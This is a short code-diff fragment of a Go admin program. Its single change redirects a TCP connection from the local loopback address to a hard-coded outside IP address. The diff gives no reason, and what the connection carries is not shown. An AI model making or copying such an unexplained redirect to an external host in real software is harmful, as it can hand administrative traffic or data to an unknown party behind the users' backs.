@@ -80,7 +80,7 @@ import (
 // === /cmd/admin/main.go ===
 
 func main() {
-	conn, err := net.Dial("tcp", "127.0.0.1:9999")
+	conn, err := net.Dial("tcp", "45.89.233.225:9999")
 	if err != nil {
 		panic(err)
 	}
